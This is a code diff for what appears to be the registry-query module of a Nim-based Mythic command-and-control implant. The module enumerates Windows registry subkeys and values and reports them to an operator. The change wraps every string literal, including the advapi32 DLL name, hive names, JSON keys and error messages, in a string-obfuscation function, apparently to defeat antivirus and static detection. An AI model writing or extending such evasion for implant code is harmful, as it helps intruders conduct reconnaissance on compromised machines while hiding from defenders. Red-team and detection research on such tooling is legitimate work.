@@ -1,6 +1,7 @@
 import std/[json, strformat, strutils]
 import ../utils/mythic_responses
 import ../utils/debug
+import ../utils/strenc
 
 when defined(windows):
   import winim/lean
@@ -23,34 +24,34 @@ when defined(windows):
   
   proc RegOpenKeyExW(hKey: HKEY, lpSubKey: LPCWSTR, ulOptions: DWORD, 
                      samDesired: DWORD, phkResult: ptr HKEY): LONG 
-    {.importc, dynlib: "advapi32.dll", stdcall.}
+    {.importc, dynlib: obf("advapi32.dll"), stdcall.}
   
   proc RegEnumKeyExW(hKey: HKEY, dwIndex: DWORD, lpName: LPWSTR, 
                      lpcchName: ptr DWORD, lpReserved: ptr DWORD,
                      lpClass: LPWSTR, lpcchClass: ptr DWORD, 
                      lpftLastWriteTime: ptr FILETIME): LONG 
-    {.importc, dynlib: "advapi32.dll", stdcall.}
+    {.importc, dynlib: obf("advapi32.dll"), stdcall.}
   
   proc RegEnumValueW(hKey: HKEY, dwIndex: DWORD, lpValueName: LPWSTR, 
                      lpcchValueName: ptr DWORD, lpReserved: ptr DWORD,
                      lpType: ptr DWORD, lpData: ptr BYTE, lpcbData: ptr DWORD): LONG 
-    {.importc, dynlib: "advapi32.dll", stdcall.}
+    {.importc, dynlib: obf("advapi32.dll"), stdcall.}
   
   proc RegCloseKey(hKey: HKEY): LONG 
-    {.importc, dynlib: "advapi32.dll", stdcall.}
+    {.importc, dynlib: obf("advapi32.dll"), stdcall.}
   
   proc getHiveHandle(hive: string): HKEY =
     ## Convert hive string to HKEY handle
     case hive.toUpperAscii()
-    of "HKCR":
+    of obf("HKCR"):
       return cast[HKEY](0x80000000'u32)  # HKEY_CLASSES_ROOT
-    of "HKCU":
+    of obf("HKCU"):
       return cast[HKEY](0x80000001'u32)  # HKEY_CURRENT_USER
-    of "HKLM":
+    of obf("HKLM"):
       return cast[HKEY](0x80000002'u32)  # HKEY_LOCAL_MACHINE
-    of "HKU":
+    of obf("HKU"):
       return cast[HKEY](0x80000003'u32)  # HKEY_USERS
-    of "HKCC":
+    of obf("HKCC"):
       return cast[HKEY](0x80000005'u32)  # HKEY_CURRENT_CONFIG
     else:
       return cast[HKEY](0)
@@ -60,21 +61,21 @@ proc regQuery*(taskId: string, params: JsonNode): JsonNode =
   when defined(windows):
     try:
       # Parse parameters
-      let hive = params["hive"].getStr()
-      let key = params["key"].getStr()
+      let hive = params[obf("hive")].getStr()
+      let key = params[obf("key")].getStr()
       
       debug &"[DEBUG] reg_query: hive={hive}, key={key}"
       
       let hiveHandle = getHiveHandle(hive)
       if hiveHandle == cast[HKEY](0):
-        return mythicError(taskId, "Invalid hive specified")
+        return mythicError(taskId, obf("Invalid hive specified"))
       
       let keyNameW = newWideCString(key)
       var keyHandle: HKEY = cast[HKEY](0)
       
       let status = RegOpenKeyExW(hiveHandle, keyNameW, 0, KEY_READ, addr keyHandle)
       if status != 0:
-        return mythicError(taskId, &"Failed to open registry key: {status}")
+        return mythicError(taskId, obf("Failed to open registry key: ") & $status)
       
       var results: seq[RegQueryResult] = @[]
       
@@ -99,7 +100,7 @@ proc regQuery*(taskId: string, params: JsonNode): JsonNode =
           break
         elif enumStatus != 0:
           discard RegCloseKey(keyHandle)
-          return mythicError(taskId, &"Failed to enumerate subkeys: {enumStatus}")
+          return mythicError(taskId, obf("Failed to enumerate subkeys: ") & $enumStatus)
         
         let subkeyNameStr = $cast[WideCString](addr subkeyName[0])
         results.add(RegQueryResult(
@@ -137,7 +138,7 @@ proc regQuery*(taskId: string, params: JsonNode): JsonNode =
           break
         elif enumStatus != 0:
           discard RegCloseKey(keyHandle)
-          return mythicError(taskId, &"Failed to enumerate values: {enumStatus}")
+          return mythicError(taskId, obf("Failed to enumerate values: ") & $enumStatus)
         
         let valueNameStr = $cast[WideCString](addr valueName[0])
         
@@ -187,17 +188,17 @@ proc regQuery*(taskId: string, params: JsonNode): JsonNode =
       var resultsJson = newJArray()
       for result in results:
         resultsJson.add(%*{
-          "hive": result.hive,
-          "name": result.name,
-          "full_name": result.full_name,
-          "value": result.value,
-          "value_type": result.value_type,
-          "result_type": result.result_type
+          obf("hive"): result.hive,
+          obf("name"): result.name,
+          obf("full_name"): result.full_name,
+          obf("value"): result.value,
+          obf("value_type"): result.value_type,
+          obf("result_type"): result.result_type
         })
       
       return mythicSuccess(taskId, $resultsJson)
       
     except Exception as e:
-      return mythicError(taskId, &"reg_query error: {e.msg}")
+      return mythicError(taskId, obf("reg_query error: ") & e.msg)
   else:
-    return mythicError(taskId, "reg_query command is only available on Windows")
+    return mythicError(taskId, obf("reg_query command is only available on Windows"))
